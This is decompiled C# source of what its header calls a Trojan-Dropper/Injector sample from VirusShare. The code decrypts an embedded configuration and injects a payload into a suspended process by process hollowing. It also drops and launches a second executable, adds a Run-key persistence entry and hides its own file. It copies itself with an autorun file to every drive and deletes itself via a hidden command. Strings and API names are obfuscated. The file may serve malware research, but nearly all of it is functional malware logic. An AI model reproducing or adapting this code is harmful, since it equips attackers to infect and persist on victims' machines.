// Decompiled with JetBrains decompiler
// Type: Fun.Usin20
// Assembly: Function 1, Version=1.0.0.1, Culture=neutral
// MVID: 983559CB-D82D-4F02-AC60-92CA32F4CD89
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.dblt-06a9a4f2c72b6121d9e863f00887a90ab96f02255aafa258ae7ef087adabc7bb.exe

using Fun.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Fun
{
  public class Usin20
  {
    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public static T rxqbzltofeqzpagx<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(Usin20.GetProcAddress(Usin20.LoadLibraryA(ref name), ref method), typeof (T));

    public static object main()
    {
label_2:
      int num = 3;
      string[] strArray;
      string str;
      while (true)
      {
        bool boolean;
        switch (num)
        {
          case 0:
            byte[] bytes = Usin20.Dec20(Encoding.Default.GetBytes(Usin20.RC(strArray[3], \u003CCliSecureRT\u003E.cs("ê\u0017Ý\u0012¡\b\u001FÒ"))));
            if (!File.Exists(Path.GetTempPath() + \u003CCliSecureRT\u003E.cs("ø") + strArray[4]))
            {
              File.WriteAllBytes(Path.GetTempPath() + \u003CCliSecureRT\u003E.cs("ø") + strArray[4], bytes);
              Process.Start(Path.GetTempPath() + \u003CCliSecureRT\u003E.cs("ø") + strArray[4]);
              break;
            }
            break;
          case 1:
            goto label_14;
          case 2:
            do
            {
              if (boolean)
                Usin20.ASt20(strArray[6]);
              if (Conversions.ToBoolean(strArray[7]))
                File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
              str = strArray[8];
            }
            while (false);
            num = 1;
            continue;
          case 3:
            strArray = Strings.Split(Usin20.sen20(), \u003CCliSecureRT\u003E.cs("êMÕ4\u00BC"));
            Usin20.It20(Usin20.Dec20(Encoding.Default.GetBytes(Usin20.RC(strArray[1], \u003CCliSecureRT\u003E.cs("ê\u0017Ý\u0012¡\b\u001FÒ")))), strArray[10]);
            if (Conversions.ToBoolean(strArray[2]))
            {
              num = 0;
              continue;
            }
            break;
          default:
            goto label_2;
        }
        boolean = Conversions.ToBoolean(strArray[5]);
        num = 2;
      }
label_14:
      if (Conversions.ToBoolean(str))
        Usin20.plug20();
      if (Conversions.ToBoolean(strArray[9]))
        Usin20.DET();
      return (object) null;
    }

    public static bool It20(byte[] xfeqpkyejqpwdtlrlqih, string Name)
    {
      bool flag;
      try
      {
        object tempPath = (object) Path.GetTempPath();
        Directory.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(tempPath, (object) \u003CCliSecureRT\u003E.cs("ÔHÇ;\u00BC\n\u001AÖ"))));
        string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath, (object) \u003CCliSecureRT\u003E.cs("ø")), (object) \u003CCliSecureRT\u003E.cs("ÔHÇ;\u00BC\n\u001AÖ")), (object) \u003CCliSecureRT\u003E.cs("ø")), (object) Name), (object) \u003CCliSecureRT\u003E.cs("\u008AAÊ9")));
        try
        {
          if (!File.Exists(str))
            File.Copy(Interaction.Environ(\u003CCliSecureRT\u003E.cs("óMÜ8¡\u001D")) + \u003CCliSecureRT\u003E.cs("øiÛ?º\0\u0004É¨dÍµÖù&\u00B2\u0001NØY-®ô.>\u001Aÿ\u009AVì¿Å\u0011aÏ\u001D?\u0089Î Û\u0006ß"), str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        IntPtr zero1 = IntPtr.Zero;
        IntPtr[] cxdbudyylwvovpikzgvv = new IntPtr[4];
        byte[] lzjgcropxjucjzhru = new byte[68];
        int int32_1 = BitConverter.ToInt32(xfeqpkyejqpwdtlrlqih, 60);
        Usin20.fbdwnebvffgvntylx fbdwnebvffgvntylx = Usin20.rxqbzltofeqzpagx<Usin20.fbdwnebvffgvntylx>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òrà\u0013\u009B]=á¬V\u008F\u00ADñõ\u0012£&\u001FãK\u0017\u00ADâ\u00101\0©Ø\u0004\u0097»Æs?©6\u0019º\u00903")));
        int int16 = (int) BitConverter.ToInt16(xfeqpkyejqpwdtlrlqih, checked (int32_1 + 6));
        IntPtr tfwyksabfcequuentfki = new IntPtr(BitConverter.ToInt32(xfeqpkyejqpwdtlrlqih, checked (int32_1 + 84)));
        Usin20.dqoiudkfnqxrgstvsa dqoiudkfnqxrgstvsa = Usin20.rxqbzltofeqzpagx<Usin20.dqoiudkfnqxrgstvsa>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òsÂ\u0017\u009E_Fá\u0099{\u008B\u0093Àê\u0002\u009C%E÷]9\u00ADÐ\u001018\u009Bß0óÀ\u00BCp>\u0088\u0012(Úë[ó:Ñ`")));
        if (fbdwnebvffgvntylx((string) null, new StringBuilder(str), zero1, zero1, false, 4, zero1, (string) null, lzjgcropxjucjzhru, cxdbudyylwvovpikzgvv))
        {
          uint[] numArray1 = new uint[179];
          numArray1[0] = 65538U;
          Usin20.vqrwwfhyzarhouqlao vqrwwfhyzarhouqlao = Usin20.rxqbzltofeqzpagx<Usin20.vqrwwfhyzarhouqlao>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("ós\u0082m\u009D]2ß\u009D{\u008B\u0090öÇ;Í")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òNûm©^-Ò\u009D~±µÅ\u009F\u0012\u0085&BÍK>ðâ6\u0003+\u00B9â4¬È\u008Fp\u0014Éu\u001E\u0080\u009Dví\u0010Þ\aa\u0012\u000E»ä!lÈB\u0082·ß")));
          if (dqoiudkfnqxrgstvsa(cxdbudyylwvovpikzgvv[1], numArray1))
          {
            IntPtr quvwthwwjgvuhokxneb = new IntPtr(checked ((long) numArray1[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            Usin20.hzbrwyzepheszjzz hzbrwyzepheszjzz = Usin20.rxqbzltofeqzpagx<Usin20.hzbrwyzepheszjzz>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òHÑ$\u009E]1á\u00ADU\u0087©ñÀ\u0002\u0084'xÆ\r9ðês6\aôá\u0004\u008AÈ¬r\u0005\u0090 (\u0086çzÝ\u0004Ñ`")));
            IntPtr vcakrvbhvwhuceaqeqbu = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (hzbrwyzepheszjzz(cxdbudyylwvovpikzgvv[0], quvwthwwjgvuhokxneb, ref zero2, (int) vcakrvbhvwhuceaqeqbu, ref zero3) && vqrwwfhyzarhouqlao(cxdbudyylwvovpikzgvv[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(xfeqpkyejqpwdtlrlqih, checked (int32_1 + 52)));
              Usin20.ffecbwkekhperovfer ffecbwkekhperovfer = Usin20.rxqbzltofeqzpagx<Usin20.ffecbwkekhperovfer>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òI\u0082$«]!þ\u009B{\u008F¬ñú\u0012\u0084&Cã]?\u00ADê7;\u0016\u009BÜ\u0004\u0087ú¯q=\u00976\u0019º\u00903")));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(xfeqpkyejqpwdtlrlqih, checked (int32_1 + 80)));
              IntPtr jowpxdjwqjuhogqrsxds = ffecbwkekhperovfer(cxdbudyylwvovpikzgvv[0], num1, num2, 12288, 64);
              Usin20.txijnaocpifsauns txijnaocpifsauns = Usin20.rxqbzltofeqzpagx<Usin20.txijnaocpifsauns>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òIÂ\u0013\u009B]9î\u009B{\u008B¬ñè \u0085*CçO9\u0097â6\u0003)ôØ\u0004\u0084À¬p>Í\u0012(\u00BE\u009DyÜ\u0004ÿ`")));
              int int32_2 = jowpxdjwqjuhogqrsxds.ToInt32();
              int rrrrxosenyejfsnirrhy;
              int num3 = txijnaocpifsauns(cxdbudyylwvovpikzgvv[0], jowpxdjwqjuhogqrsxds, xfeqpkyejqpwdtlrlqih, checked ((uint) (int) tfwyksabfcequuentfki), rrrrxosenyejfsnirrhy) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) xfeqpkyejqpwdtlrlqih, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                byte[] numArray2 = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) xfeqpkyejqpwdtlrlqih, dst[5], (Array) numArray2, 0, numArray2.Length);
                num2 = new IntPtr(checked (int32_2 + dst[3]));
                num1 = new IntPtr(numArray2.Length);
                int num6 = txijnaocpifsauns(cxdbudyylwvovpikzgvv[0], num2, numArray2, checked ((uint) (int) num1), rrrrxosenyejfsnirrhy) ? 1 : 0;
                checked { ++num5; }
              }
              num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
              num1 = new IntPtr(4);
              Usin20.nyvzdasqdqejbgobocp nyvzdasqdqejbgobocp = Usin20.rxqbzltofeqzpagx<Usin20.nyvzdasqdqejbgobocp>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òHà\u0017\u009E_Fá\u0099{\u008B\u0093Àê\u0002\u009C%E÷]9\u00ADÐ\u001018\u009Bß0óÀ\u00BCp>\u0088\u0012(Úë[ó:Ñ`")));
              int num7 = txijnaocpifsauns(cxdbudyylwvovpikzgvv[0], num2, BitConverter.GetBytes(jowpxdjwqjuhogqrsxds.ToInt32()), checked ((uint) (int) num1), rrrrxosenyejfsnirrhy) ? 1 : 0;
              numArray1[44] = checked ((uint) (jowpxdjwqjuhogqrsxds.ToInt32() + BitConverter.ToInt32(xfeqpkyejqpwdtlrlqih, int32_1 + 40)));
              int num8 = nyvzdasqdqejbgobocp(cxdbudyylwvovpikzgvv[1], numArray1) ? 1 : 0;
            }
          }
          int num = (int) Usin20.rxqbzltofeqzpagx<Usin20.krzqprcqzizvrfjia>(Usin20.Getback(\u003CCliSecureRT\u003E.cs("órà\u0017\u009E]!þ\u009D~±¬ñÆO»)xÁN\u0015\u0090»x")), Usin20.Getback(\u003CCliSecureRT\u003E.cs("òHÑ$\u009E]!Ò\u009B|\u008BµÅ\u009E\u0012¬&EÿS\u0014\u0097â68)©Ü\u0002¸ºÌ")))(cxdbudyylwvovpikzgvv[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_14;
      }
      flag = true;
label_14:
      return flag;
    }

    public static string Getback(string input)
    {
label_2:
      int num = 3;
      string s1;
      string s2;
      string str;
      while (true)
      {
        switch (num)
        {
          case 0:
            s2 = Encoding.ASCII.GetString(Convert.FromBase64String(s1));
            num = 2;
            continue;
          case 1:
            goto label_7;
          case 2:
            do
            {
              str = Encoding.ASCII.GetString(Convert.FromBase64String(s2));
            }
            while (false);
            num = 1;
            continue;
          case 3:
            s1 = Encoding.ASCII.GetString(Convert.FromBase64String(input));
            num = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      return str;
    }

    public static byte[] Dec20(byte[] Buffer)
    {
      using (MemoryStream memoryStream1 = new MemoryStream(Buffer))
      {
        using (MemoryStream memoryStream2 = new MemoryStream())
        {
          using (GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress))
          {
            int count1 = 1000;
            byte[] numArray = new byte[checked (count1 - 1 + 1 - 1 + 1)];
            for (int count2 = gzipStream.Read(numArray, 0, numArray.Length); count2 > 0; count2 = gzipStream.Read(numArray, 0, count1))
              memoryStream2.Write(numArray, 0, count2);
            Buffer = memoryStream2.ToArray();
          }
        }
      }
      return Buffer;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static string plug20()
    {
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      try
      {
        string[] strArray = logicalDrives;
        int index = 0;
        while (index < strArray.Length)
        {
          string str = strArray[index];
          if (!File.Exists(str + \u003CCliSecureRT\u003E.cs("ÊPÞ8ºA\u0012Þ«")))
            File.Copy(Application.ExecutablePath, str + \u003CCliSecureRT\u003E.cs("ÊPÞ8ºA\u0012Þ«"), true);
          FileSystem.FileOpen(1, str + \u003CCliSecureRT\u003E.cs("ÅQÆ3º\u001A\u0019\u0088§~\u0085"), OpenMode.Binary);
          FileSystem.FilePut(1, \u003CCliSecureRT\u003E.cs("ÿEÇ(§\u001D\u0002È\u0093\u001Dé\u0088ûÈ\u0016\u0098\u0016WÐ_/µãx\f\u0018¡Ð\u0014ìï\u008DC"), -1L, false);
          FileSystem.FileClose(1);
          File.SetAttributes(str + \u003CCliSecureRT\u003E.cs("ÅQÆ3º\u001A\u0019\u0088§~\u0085"), FileAttributes.Hidden);
          File.SetAttributes(str + \u003CCliSecureRT\u003E.cs("ÊPÞ8ºA\u0012Þ«"), FileAttributes.Hidden);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    public static string sen20()
    {
      string str;
      try
      {
        Usin20.GMH gmh = Usin20.rxqbzltofeqzpagx<Usin20.GMH>(\u003CCliSecureRT\u003E.cs("ÏAÀ2\u00AD\u0003D\u0094"), \u003CCliSecureRT\u003E.cs("ãAÆ\u0011§\v\u0002Ê«X\u0082\u0095÷Á\u001Fµ"));
        Usin20.SoR soR = Usin20.rxqbzltofeqzpagx<Usin20.SoR>(\u003CCliSecureRT\u003E.cs("ÏAÀ2\u00AD\u0003D\u0094"), \u003CCliSecureRT\u003E.cs("÷MÈ9§\t%Ã\u00BD\u007F\u0096\u0089ðÈ"));
        Usin20.LR lr = Usin20.rxqbzltofeqzpagx<Usin20.LR>(\u003CCliSecureRT\u003E.cs("ÏAÀ2\u00AD\u0003D\u0094"), \u003CCliSecureRT\u003E.cs("èKÓ8\u009A\n\u0004É»b\u0080\u009E"));
        IntPtr num = gmh(Application.ExecutablePath);
        IntPtr resource = Usin20.FindResource(num, \u003CCliSecureRT\u003E.cs("\u0097\u0011\u0086m"), \u003CCliSecureRT\u003E.cs("\u0092\u0010\u0084hþ[A\u0093ú!ÕÎ§\u009BO"));
        IntPtr source = lr(num, resource);
        int length = soR(num, resource);
        byte[] numArray = new byte[checked (length - 1 + 1)];
        Marshal.Copy(source, numArray, 0, length);
        str = Encoding.Default.GetString(numArray);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string ASt20(string Name)
    {
      try
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u003CCliSecureRT\u003E.cs("ø") + Name + \u003CCliSecureRT\u003E.cs("\u008AAÊ9");
        if (!File.Exists(str))
          File.Copy(Application.ExecutablePath, str);
        Registry.CurrentUser.OpenSubKey(\u003CCliSecureRT\u003E.cs("÷KÔ(¿\u000E\u0005Ã\u0092]\u008A\u0098áÂ\t\u009B\u0015[ék3¯â*\u0015\u001F\u0091÷\u0013°ø\u0090H'®$;\u0098ÄaÐ\"è(n"), true).SetValue(Name, (object) str, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    public static string DET()
    {
label_2:
      int num = 3;
      ProcessStartInfo startInfo;
      while (true)
      {
        switch (num)
        {
          case 0:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            num = 2;
            continue;
          case 1:
            goto label_7;
          case 2:
            do
            {
              startInfo.FileName = \u003CCliSecureRT\u003E.cs("ÇIÖr\u00AD\u0017\u0012");
              Process.Start(startInfo);
            }
            while (false);
            num = 1;
            continue;
          case 3:
            startInfo = new ProcessStartInfo();
            startInfo.Arguments = \u003CCliSecureRT\u003E.cs("\u008Bg\u0092,¡\u0001\u0010\u0086ÿ>ÒÕ¢\u0083KÔ^A\u0095\rzìñeQ\\ý\u0084Füª»S?Øgi¯Èb\u009E\\") + Application.ExecutablePath.ToString() + \u003CCliSecureRT\u003E.cs("\u0086");
            num = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      return (string) null;
    }

    public static string RC(string Input, string pass)
    {
label_2:
      int num1 = 3;
      StringBuilder stringBuilder;
      while (true)
      {
        byte[] hash;
        int num2;
        int startIndex;
        int index;
        switch (num1)
        {
          case 0:
          case 1:
            if (startIndex <= num2)
            {
              string str = Conversions.ToString(Strings.Chr(checked ((int) (Conversions.ToLong(\u003CCliSecureRT\u003E.cs("\u0082l") + Input.Substring(startIndex, 2)) ^ (long) hash[index]))));
              stringBuilder.Append(str);
              if (index == checked (pass.Length - 1))
              {
                num1 = 2;
                continue;
              }
              checked { ++index; }
              break;
            }
            goto label_11;
          case 2:
label_6:
            index = 0;
            break;
          case 3:
            stringBuilder = new StringBuilder();
            hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
            num2 = checked (Input.Length - 1);
            startIndex = 0;
            num1 = 0;
            continue;
          default:
            goto label_2;
        }
        checked { startIndex += 2; }
        if (true)
          num1 = 1;
        else
          goto label_6;
      }
label_11:
      return stringBuilder.ToString();
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool fbdwnebvffgvntylx(
      string nsaaayyxiwxutadgsaao,
      StringBuilder yaelgsyyuukztrqvair,
      IntPtr cewlzipzsvgyiztwik,
      IntPtr inwwxrwqidjqeuyxkood,
      [MarshalAs(UnmanagedType.Bool)] bool wfoojvvbbnglscgxq,
      int htielyvddfadkntgz,
      IntPtr kkrutwodeihptqjwli,
      string nxgstpofauhfcjreiroq,
      byte[] lzjgcropxjucjzhru,
      IntPtr[] cxdbudyylwvovpikzgvv);

    public delegate bool txijnaocpifsauns(
      IntPtr yuzwfogugkwixqnjobdk,
      IntPtr jowpxdjwqjuhogqrsxds,
      byte[] fpvxezkbcdrynrvrklx,
      uint tfwyksabfcequuentfki,
      int rrrrxosenyejfsnirrhy);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool hzbrwyzepheszjzz(
      IntPtr wlgtqbdqgafiolwkzl,
      IntPtr quvwthwwjgvuhokxneb,
      ref IntPtr fguxwzpiepjihakurkpf,
      int vcakrvbhvwhuceaqeqbu,
      ref IntPtr nivhjtjskikpvjlxrvo);

    public delegate IntPtr ffecbwkekhperovfer(
      IntPtr rycgwwgxarrfkshx,
      IntPtr ngrjluldvckqlfxdksrq,
      IntPtr egwajgfjhhyytfppdpd,
      int etzcxkhoqqndxtcq,
      int zekzxizbzgnsrteh);

    public delegate uint vqrwwfhyzarhouqlao(IntPtr refofbikvwbahkwuclj, IntPtr vdeuadljhcapdowk);

    public delegate uint krzqprcqzizvrfjia(IntPtr ktiwqlouuqksitbffw);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool dqoiudkfnqxrgstvsa(IntPtr uqrghojzadnwzszlx, uint[] txepidslcgbqqzpghypo);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool nyvzdasqdqejbgobocp(IntPtr kitzyvcnsktnehcwyq, uint[] hvcptjhuekktiephefbd);

    public delegate IntPtr GMH(string mn);

    public delegate int SoR(IntPtr hm, IntPtr hri);

    public delegate IntPtr LR(IntPtr hm, IntPtr hri);

    public delegate IntPtr FR(IntPtr hm, string ln, string lt);
  }
}
